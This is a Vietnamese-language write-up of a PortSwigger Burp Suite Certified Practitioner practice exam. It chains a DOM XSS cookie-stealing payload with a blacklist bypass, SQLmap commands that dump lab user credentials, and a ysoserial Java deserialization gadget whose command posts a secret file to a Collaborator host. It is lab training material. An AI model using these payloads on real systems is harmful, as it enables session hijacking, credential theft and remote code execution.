# Write-up for Burp Suite Certified Practitioner Practice Exam

Author: `HoangNCH`

### 1. Khai thác DOM-based XSS tại chức năng "Search the blog":

##### a) Initial reconnaissance:

- Sử dụng DOM Invader để inject canary vào form, ta phát hiện được các source và sink như sau:

![image-20211213222734274](https://user-images.githubusercontent.com/61876488/146169208-1eb515aa-faf9-4919-9085-d5ada6a2e7e0.png)

- Trong đó có sink chứa hàm `eval` có thể chạy được script js, còn source nằm ở hàm `location.search` sẽ đọc nội dung phần querystring của url hiện tại (`?query=xss2%27"<>`), click vào stack trace để xem sink và source nằm ở đâu trong js code:

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);  // sink
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);				 // source
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        ...
}

```

- `window.location.search` có thể lấy data tùy ý mà ta nhập vào từ url parameter `query`, sau đó khi `xhr.send()` thì hàm `xhr.onreadystatechange` sẽ chạy, dẫn đến biến `searchResultsObj` được khởi tạo và được gán bằng response của server khi request `"GET", path + window.location.search` được gửi. Vấn đề là chúng ta chưa biết `path` là gì. Tìm trong HTTP History của Burp Suite ta có:

![image-20211213224603286](https://user-images.githubusercontent.com/61876488/146169329-819e5586-94fa-4eed-b0f6-be11cde765f5.png)

- Như vậy `path=="/search"` và  `searchTerm=="xss2'"<>"`, chính là canary mà ta truyền vào. Response ở hình trên ở dạng JSON và do các kí tự truyền vào có `"` nên định dạng JSON bị lỗi, do đó mục `..search results for..` không hiện ra gì. Chúng ta cần phải escape nó.

##### b) Escape and bypass:

- Dùng payload `"+alert(1)}//` để escape JSON.

![image-20211213225524527](https://user-images.githubusercontent.com/61876488/146169366-6806c816-fc92-4168-a9b7-2d46d778e568.png)

- Do web app lại blacklist`document.cookie` nên ta chỉ có thể `alert(1)`:

![image-20211213225726052](https://user-images.githubusercontent.com/61876488/146169426-e2946d9c-0bb5-4c07-8276-4cbbf917eaa1.png)

- Nhưng ta vẫn có thể bypass bằng cách dùng `document["cookie"]`:

![image-20211213225835470](https://user-images.githubusercontent.com/61876488/146169487-b96dde85-3d72-415b-983a-b1346d8b70ad.png)

- Web app còn blacklist cả dấu `.`, vốn hay được dùng trong url. Thử payload `"+alert(' . ')}//`:

![image-20211213230124046](https://user-images.githubusercontent.com/61876488/146169515-c176c379-172f-48b5-abbf-ce883c7251fb.png)

- Nhưng chúng ta có thể url encode các dấu chấm thành `%2e` (CVE-2021-41773). Thử payload `"+(location="https://www%2ew3schools%2ecom/?a=1")}//`:

![image-20211213230633913](https://user-images.githubusercontent.com/61876488/146169608-19a26787-cde1-4ea3-9d6d-4f881f86396b.png)

##### 3) Exploit:

- Sử dụng exploit server của bài lab, tại `body` sử dụng script mẫu như sau:

```html
<script>
location='https://<lab id>.web-security-academy.net/?query=%22%2B%28location%3D%22https%3A%2F%2Fexploit-<exloit server id>%252eweb-security-academy%252enet%2F%2F%3Fcookie%3D%22%2Bdocument%5B%22cookie%22%5D%29%7D%2F%2F';
</script>
```

- Sau khi bấm `deliver exploit to victim` rồi `view exploit` thì vào `access log` kiểm tra:

![image-20211213231136699](https://user-images.githubusercontent.com/61876488/146169678-f5827df6-b5a3-4952-a324-75fee4c8e571.png)

- Check access log chúng ta thấy một cookie "lạ", không phải nằm trên client side của chúng ta mà có lẽ là của victim (được highlight bên dưới):

![image-20211213231618624](https://user-images.githubusercontent.com/61876488/146169729-99373e9e-3644-4a92-9249-2608900db836.png)

- Copy cookie này rồi thay thế cho cookie hiện tại thì ta chiếm được account `carlos`:

![image-20211213231748164](https://user-images.githubusercontent.com/61876488/146169768-44764d26-ca61-41c6-9fc2-c5e99478596f.png)

### 2) Khai thác SQL Injection tại chức năng "Advanced search": 

##### a) Initial reconnaissance:

- Sau khi login vào thì chúng ta unlock được chức năng "Advanced search":
- Thử search tại API `GET /advanced_search` với url parameter `sort-by=DATE'`thì server bị lỗi SQL:

![image-20211213233700777](https://user-images.githubusercontent.com/61876488/146169796-d3fef678-23b1-477a-88d8-39081c9ab40a.png)

- Như vậy web app chắc chắn bị SQLi, đồng thời ta biết được database mà nó đang sử dụng là **PostgreSQL**. Thử payload `(case when (1=0) then 2 else 1/0 end)` để comfirm có thể khai thác boolean-based SQLi.

##### b) SQLmap fuzzing:

- Sử dụng SQLmap với endpoint và url parameter đã biết bị dính SQLi là `sort-by` (đánh dấu bằng dấu `*`): 

```bash
sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump
```

![image-20211213233720286](https://user-images.githubusercontent.com/61876488/146169833-e2bd1f02-c3e3-4a65-92e3-ad0a09598ee2.png)

![image-20211214095628881](https://user-images.githubusercontent.com/61876488/146169883-85286f24-35bf-4baa-a63d-546af660baf4.png)

![image-20211214102141470](https://user-images.githubusercontent.com/61876488/146169901-54b0bbf4-51e2-4aeb-9458-2c0a89140653.png)

- Sau khi enumerate bằng SQLmap thì có được current database là `public`, có 1 table "khả nghi" là `users`, thử dump table này thì thấy nó có 2 column là `username` và `password`. Do đó tiếp tục dùng lệnh SQLmap sau để dump 2 column kia:

```bash
sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump -D public -T users -C username,password
```

![image-20211214105324719](https://user-images.githubusercontent.com/61876488/146170101-864359b4-3ba1-4978-802b-ab779924814b.png)

- Lấy được `administrator | cjbnksa6guo0y4a96o04 `, account có role admin do đó chúng ta có thể unlock được chức năng "Admin panel":

![image-20211214105637238](https://user-images.githubusercontent.com/61876488/146224830-e474e8e4-a211-459c-a10c-44ec2df9de03.png)

### 3) Khai thác java deserialization tại chức năng "Admin panel":

##### a) Initial reconnaissance:

- Để ý thấy khi vào chức năng này thì tại client side chúng ta được cấp cho một cookie là "admin-prefs":

![image-20211214112246704](https://user-images.githubusercontent.com/61876488/146225794-949ab1da-f48f-4e6e-8a63-e46948664405.png)

- Nếu thay đổi cookie này tùy ý thì:

![image-20211214233523121](https://user-images.githubusercontent.com/61876488/146225553-4287adcd-3c42-4038-85b8-048ccddc96c7.png)

- Decode này bằng **Decoder** của Burp Suite ta biết được quá trình encode của cookie sau khi serialize là : gzip encode -->  base64 encode --> url encode:

![image-20211214123526651](https://user-images.githubusercontent.com/61876488/146225700-4171ece7-00d7-48dd-b133-50f181eb12af.png)

- Trong plain text trên có đoạn `lab.display.admin.prefs.JavaPrefsCookieStrategy`. Nhiều khả năng web app này sẽ bị dính vuln **java deserialization** tại cookie  `admin-prefs` này.

##### b) Create pre-built gadget chain with ysoserial and exploit:

- Sau khi thử tạo các gadget chain bằng tool [ysoserial](https://github.com/frohoff/ysoserial) theo sample như sau:

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar <payload types> '[command]' | gzip -f | base64 -w0
```

![image-20211215154314051](https://user-images.githubusercontent.com/61876488/146225935-e7c9ecfa-cedb-4c1d-9fa9-3260917195bf.png)

- Ta phát hiện có một payload type có thể dùng được là **CommonsCollections6** vì nó trả về status code 200, trong khi các payload type khác đều trả về status code 500 và **ClassNotFoundException** (các payload type khác có thể có exception khác, dùng phương pháp thử rồi loại suy thông qua exeption để tìm ra payload type phù hợp). 

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 'curl https://<burp colab id>.burpcollaborator.net' | gzip -f | base64 -w0
```

###### Kết quả:

![image-20211214173728534](https://user-images.githubusercontent.com/61876488/146226035-87a069d0-3b5e-4680-9637-6f0500294d1e.png)

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'curl -X POST -d Hello https://<burp colab id>.burpcollaborator.net' | gzip -f | base64 -w0
```

###### Kết quả:

![image-20211215153848790](https://user-images.githubusercontent.com/61876488/146226107-3b70e47b-2c23-4cc4-80aa-c30510c693ba.png)

![image-20211215163312473](https://user-images.githubusercontent.com/61876488/146226178-34d29412-1f4a-4eb0-849c-abd37701766c.png)

- Điều này có nghĩa là gadget chain tạo với payload type **CommonsCollections6** là hợp lệ và chúng ta có thể RCE thông qua gadget chain này. tạo payload như trong hình:

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'wget --post-file /home/carlos/secret c2ft9nahenbthexwc6hd0c9m4da3ys.burpcollaborator.net' | gzip -f | base64 -w0
```

![image-20211215154458664](https://user-images.githubusercontent.com/61876488/146226291-b748f2ca-8558-4c6b-9c03-a6a7dfa096ab.png)

- Lưu ý trước khi cho payload trên vào cookie `admin-prefs` thì phải URL encode nó:

![image-20211215154844486](https://user-images.githubusercontent.com/61876488/146226418-fe236de8-9ac5-4541-adbc-5642f32865fd.png)

- Cuối cùng thì chúng ta gửi request và poll Burp Collaborator Client và đợi kết quả:

![image-20211215155200561](https://user-images.githubusercontent.com/61876488/146226480-ec4e59b6-9818-43e8-a26e-78997c167d14.png)

###### Lưu ý: Cách khai thác Java Deserialize ở trên dựa vào bài lab của PortSwigger là [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons).

##### 4) Kết quả Practice Exam BSCP của mình:

![image-20211215155436265](https://user-images.githubusercontent.com/61876488/146226623-dd2ddd99-5b72-425c-b055-2d6316414c69.png)

![image-20211215155444115](https://user-images.githubusercontent.com/61876488/146226686-18428acd-1f33-4f19-9910-8a5afc716e1f.png)

![image-20211215165432252](https://user-images.githubusercontent.com/61876488/146226741-573b1d60-6ff6-479f-8c87-db0085b8ebcc.png)
